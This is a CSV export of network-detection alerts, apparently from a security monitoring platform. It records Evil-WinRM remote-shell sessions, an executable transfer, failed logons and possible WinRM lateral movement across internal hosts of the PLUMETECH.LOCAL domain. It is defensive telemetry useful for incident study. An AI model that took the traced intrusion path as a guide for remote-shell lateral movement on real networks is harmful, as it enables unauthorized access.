+Medium,35907,2025-03-28T13:48:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35908,2025-03-28T13:49:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35909,2025-03-28T13:50:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35912,2025-03-28T13:52:17Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35913,2025-03-28T13:51:13Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35916,2025-03-28T13:52:39Z,Indicator,Threat Behavior,HTTP Download Executable Smaller than 1 MB,HTTP Download Executable Smaller than 1 MB,HTTP Executable Download Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35917,2025-03-28T13:52:20Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35931,2025-03-28T13:53:49Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35933,2025-03-28T13:54:49Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35934,2025-03-28T13:55:53Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35941,2025-03-28T13:55:56Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,35947,2025-03-28T13:57:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36047,2025-03-28T13:59:11Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36048,2025-03-28T13:58:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36050,2025-03-28T13:59:11Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Low,36061,2025-03-28T13:59:11Z,Communication,Indicator,Failed HTTP Logon,"Asset 1759 (10.0.4.43) returned an HTTP response code of 401 'Unauthorized' to asset 1832 (10.0.4.11), which represents a failed logon attempt via HTTP by asset 1832. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1832,1759",,,10.0.4.43,10.0.4.11,,b43e48b1-ea76-4f70-878c-b4bd0fd2cd93,
+Medium,36062,2025-03-28T13:52:39Z,Communication,Threat Behavior,File Transfer of Executable,Host 10.0.4.11 (asset 1905) transferred file /main.exe (application/x-msdos-program) (sha256 7fcf381749661d066404def5c887959d24214c29605a3aee5ff080b2c138c2f7) to 10.0.4.30 (asset 1832).,File Transfer of Executable,"1832,1905",,,10.0.4.30,10.0.4.11,,31a7707d-99ad-495e-8a60-ad97cd6c1f05,
+Low,36067,2025-03-28T13:52:49Z,Communication,Configuration,New Global User Agent,User Agent 'Mozilla/5.0' was seen in the environment for the first time. Originating from asset 1832 (10.0.4.11) to 10.0.4.30 (10.0.4.30).,User Agent First Seen Globally,"1832,1905",,,10.0.4.11,10.0.4.30,,834221aa-bbdd-4d13-b405-cf8de97fd469,
+Medium,36082,2025-03-28T13:59:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36083,2025-03-28T14:00:10Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Low,36084,2025-03-28T13:52:49Z,Asset,Configuration,Detected 6 NewUserAgent between 2025-03-28T13:45:11.919Z and 2025-03-28T13:52:49.627Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: 48555172-22a1-4d98-bb60-28fbb56e2d77, 024e5e7d-313f-4154-884b-9dbea3cec0b8, 000a36e5-2ef8-480c-928c-d808e6119d90, 0c46c9c2-a4e4-4ec3-97ad-7762df668360, 00009bc4-047f-4293-8a36-fdd86a3426da, 834221aa-bbdd-4d13-b405-cf8de97fd469;
+  src__mac: ;
+  src_ip: 10.0.4.11, 10.0.6.11, 10.0.1.44, 10.0.8.43, 10.0.1.11, 10.0.11.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1690, 45, 1832, 1933, 1754, 141;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Mozilla/5.0, Microsoft NetworkListManager, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.2903.86, User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0, Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36;
+  src__ip: ;",User Agent First Seen,"141,1690,45,1832,1933,1754",,,,,"10.0.1.44,10.0.8.43,10.0.1.11,10.0.4.11,10.0.11.30,10.0.6.11","48555172-22a1-4d98-bb60-28fbb56e2d77, 024e5e7d-313f-4154-884b-9dbea3cec0b8, 000a36e5-2ef8-480c-928c-d808e6119d90, 0c46c9c2-a4e4-4ec3-97ad-7762df668360, 00009bc4-047f-4293-8a36-fdd86a3426da, 834221aa-bbdd-4d13-b405-cf8de97fd469",
+Medium,36086,2025-03-28T14:00:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36087,2025-03-28T14:01:10Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36089,2025-03-28T14:01:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36090,2025-03-28T14:02:10Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36093,2025-03-28T14:02:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36094,2025-03-28T14:03:10Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36100,2025-03-28T14:04:10Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36101,2025-03-28T14:03:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36102,2025-03-28T14:04:55Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36103,2025-03-28T14:04:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36104,2025-03-28T14:05:55Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36106,2025-03-28T14:06:55Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36107,2025-03-28T14:05:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36108,2025-03-28T14:06:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36111,2025-03-28T14:07:55Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36112,2025-03-28T14:07:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36113,2025-03-28T14:08:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36114,2025-03-28T14:08:55Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36115,2025-03-28T14:09:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36120,2025-03-28T14:10:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36122,2025-03-28T14:09:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36123,2025-03-28T14:10:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36132,2025-03-28T14:11:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36134,2025-03-28T14:12:17Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36135,2025-03-28T14:11:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36136,2025-03-28T14:12:17Z,Indicator,Indicator,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM wsman Rapid Access - Possible Lateral Movement,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36137,2025-03-28T14:12:17Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36138,2025-03-28T14:12:27Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36142,2025-03-28T14:12:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36143,2025-03-28T14:12:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Low,36153,2025-03-28T14:06:41Z,Communication,Configuration,Detected 12 NewX509Certificate between 2025-03-28T13:57:20.524Z and 2025-03-28T14:06:41.000Z,"Sample NewX509Certificate values include:
+  server: 2.16.110.145, 10.0.5.11, 52.182.143.210, 10.0.4.11, 2.16.110.200, 20.189.173.1, 20.60.1.68, 2.16.110.121, 40.118.185.161, 184.25.50.138;
+  subject: , CN=DC1.PLUMETECH.LOCAL, CN=*.nui.media;
+  not_before: , 2025-02-22T00:00:00Z, 2025-03-27T01:24:33Z;
+  server_asset_id: 4011, 370, 1699, 4013, 4009, 1832, 4014, 4008, 4015, 369;
+  dst__port: ('',);
+  dns: ;
+  uuid: ca9e4c58-9bfb-4ad0-b414-b4e082c69be9, 31b34b9b-af49-4573-b714-33091e9087da, 8857554b-c147-4fee-a135-b48f168f4f4d, c0274d69-c0fd-478a-817b-54be78ca98df, 1d1bcbb0-3aae-4875-8fda-146b4dc22311, 3361aca8-1415-4ad0-b949-71600663fa5c, 84d0b053-aa4e-4f29-a2f7-cb96f17b4277, 0339eca1-1d3f-492c-b1a7-1bb53a82c0b2, 74d353a9-b22f-47bb-9086-e09c00374b58, 30a54e8e-5975-4650-beaf-356ed6568d17;
+  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=Amazon, CN=Amazon RSA 2048 M02;
+  client_asset_id: 1801, 1936, 1759, 45;
+  src__mac: ;
+  not_after: , 2026-03-23T23:59:59Z, 2026-03-27T01:24:33Z;
+  dst__mac: ;
+  protocol: ;
+  dst__ip: ;
+  client: 10.0.4.43, 10.0.1.11, 10.0.5.30, 10.0.10.29;
+  src__port: ('',);
+  src__ip: ;",X509 Certificate First Seen,"4011,4013,4009,4008,4014,4015,45,1759,370,1699,1832,369,1801,1936",,,"20.189.173.1,20.60.1.68,2.16.110.200,54.221.237.124,40.118.185.161,184.25.50.138,2.16.110.121,10.0.5.11,10.0.4.11,2.16.110.145","10.0.1.11,10.0.4.43,10.0.10.29,10.0.5.30",,"ca9e4c58-9bfb-4ad0-b414-b4e082c69be9, 31b34b9b-af49-4573-b714-33091e9087da, 8857554b-c147-4fee-a135-b48f168f4f4d, c0274d69-c0fd-478a-817b-54be78ca98df, 1d1bcbb0-3aae-4875-8fda-146b4dc22311, 3361aca8-1415-4ad0-b949-71600663fa5c, 84d0b053-aa4e-4f29-a2f7-cb96f17b4277, 0339eca1-1d3f-492c-b1a7-1bb53a82c0b2, 74d353a9-b22f-47bb-9086-e09c00374b58, 30a54e8e-5975-4650-beaf-356ed6568d17",
+Low,36160,2025-03-28T14:12:17Z,Communication,Indicator,Failed HTTP Logon,"Asset 1762 (10.0.4.44) returned an HTTP response code of 401 'Unauthorized' to asset 1759 (10.0.4.43), which represents a failed logon attempt via HTTP by asset 1759. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1759,1762",,,10.0.4.44,10.0.4.43,,66547ffa-6c29-4303-8b40-851e624328dc,
+Low,36162,2025-03-28T14:10:39Z,Communication,Indicator,Failed HTTP Logon,"Asset 1832 (10.0.4.11) returned an HTTP response code of 401 'Unauthorized' to asset 1905 (10.0.4.30), which represents a failed logon attempt via HTTP by asset 1905. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1832,1905",,,10.0.4.11,10.0.4.30,,e15b2a5e-f5a4-41da-9a19-7d21b2d0c134,
+Medium,36163,2025-03-28T14:13:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36164,2025-03-28T14:13:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36196,2025-03-28T14:15:23Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36197,2025-03-28T14:14:37Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36198,2025-03-28T14:14:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36199,2025-03-28T14:14:35Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36200,2025-03-28T14:14:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36207,2025-03-28T14:15:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36208,2025-03-28T14:15:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36221,2025-03-28T14:16:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36222,2025-03-28T14:16:40Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1762",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36223,2025-03-28T14:16:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36229,2025-03-28T14:18:16Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36230,2025-03-28T14:17:43Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36231,2025-03-28T14:17:20Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36232,2025-03-28T14:17:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36235,2025-03-28T14:19:14Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36236,2025-03-28T14:19:15Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36237,2025-03-28T14:18:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36238,2025-03-28T14:17:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36239,2025-03-28T14:18:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36240,2025-03-28T14:19:08Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36241,2025-03-28T14:20:10Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36242,2025-03-28T14:19:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36247,2025-03-28T14:20:39Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36248,2025-03-28T14:21:19Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36249,2025-03-28T14:19:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36251,2025-03-28T14:20:56Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36252,2025-03-28T14:21:40Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36265,2025-03-28T14:22:19Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36266,2025-03-28T14:22:40Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36268,2025-03-28T14:23:19Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36269,2025-03-28T14:24:21Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36270,2025-03-28T14:23:40Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36275,2025-03-28T14:26:09Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36276,2025-03-28T14:25:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1905",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36277,2025-03-28T14:26:06Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36280,2025-03-28T14:26:42Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36285,2025-03-28T14:28:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Low,36287,2025-03-28T14:17:16Z,Communication,Configuration,New SMB Communication detected,"New SMB_FileInfo (version: ['SMB1', 'SMB2']) traffic between Asset:1759 and Asset:1762",New SMB Communication Detection,"1759,1762",,,10.0.4.43,10.0.4.44,,1a6a492a-3904-4871-8014-3698b637e685,
+Medium,36291,2025-03-28T14:29:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1832,1759",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36292,2025-03-28T14:28:12Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36317,2025-03-28T14:29:40Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36318,2025-03-28T14:30:13Z,Indicator,Indicator,Evil-WinRM User Agent Rapid Usage,Evil-WinRM User Agent Rapid Usage,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Medium,36319,2025-03-28T14:29:42Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1905,1832",,,10.0.4.30,10.0.4.11,,Network Traffic,
+Medium,36320,2025-03-28T14:30:04Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1759,1832",,,10.0.4.11,10.0.4.43,,Network Traffic,
+Medium,36321,2025-03-28T14:30:40Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
+Low,36322,2025-03-28T14:29:18Z,Asset,Configuration,Detected 16 NewUserAgent between 2025-03-28T14:09:31.768Z and 2025-03-28T14:29:18.028Z,"Sample NewUserAgent values include:
+  dst__port: ('',);
+  uuid: 9b3bbe6c-400f-48c2-940d-9bfb4d4f789b, 000a6076-95d8-43db-8cd1-2c0690a88890, 00e716bb-0db8-4f97-8b10-81c333606e31, 13c75ecd-962d-4bad-9988-e10924ad8dbe, 00b751b7-357d-4d45-b195-e4ef64fc3d39, 0198aeb7-8c78-4f2d-be79-e73bf02962ce, e7af4285-ec9d-4696-9b91-ff81bbed318d, 2ab079b9-5372-4868-9e39-786272fb10be, 002c0c60-183b-4781-9ef6-544103deaaf8, 68e94fcb-f3ba-4735-a6e2-9e9fef1e396c;
+  src__mac: ;
+  src_ip: 10.0.4.43, 10.0.9.12, 10.0.8.12, 10.0.8.11, 10.0.9.29, 10.0.8.29, 10.0.11.30;
+  dst__mac: ;
+  protocol: ;
+  src_asset_id: 1784, 1729, 1759, 1933, 1854, 1687, 1779;
+  dst__ip: ;
+  src__port: ('',);
+  user_agent: Microsoft-Delivery-Optimization/10.0, Mozilla/5.0, Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0, Ruby WinRM Client (2.8.3, ruby 3.3.7 (2025-01-15)), Microsoft BITS/7.8, Microsoft Edge Update/1.3.195.45;winhttp, Microsoft-CryptoAPI/10.0, Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15, Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.51, curl/8.12.1;
+  src__ip: ;",User Agent First Seen,"1759,1784,1729,1933,1854,1687,1779",,,,,"10.0.4.43,10.0.8.12,10.0.9.29,10.0.11.30,10.0.9.12,10.0.8.29,10.0.8.11","9b3bbe6c-400f-48c2-940d-9bfb4d4f789b, 000a6076-95d8-43db-8cd1-2c0690a88890, 00e716bb-0db8-4f97-8b10-81c333606e31, 13c75ecd-962d-4bad-9988-e10924ad8dbe, 00b751b7-357d-4d45-b195-e4ef64fc3d39, 0198aeb7-8c78-4f2d-be79-e73bf02962ce, e7af4285-ec9d-4696-9b91-ff81bbed318d, 2ab079b9-5372-4868-9e39-786272fb10be, 002c0c60-183b-4781-9ef6-544103deaaf8, 68e94fcb-f3ba-4735-a6e2-9e9fef1e396c",
+Medium,36326,2025-03-28T14:31:25Z,Indicator,Indicator,Evil-WinRM User Agent,Evil-WinRM User Agent,WinRM Signatures,"1762,1759",,,10.0.4.43,10.0.4.44,,Network Traffic,
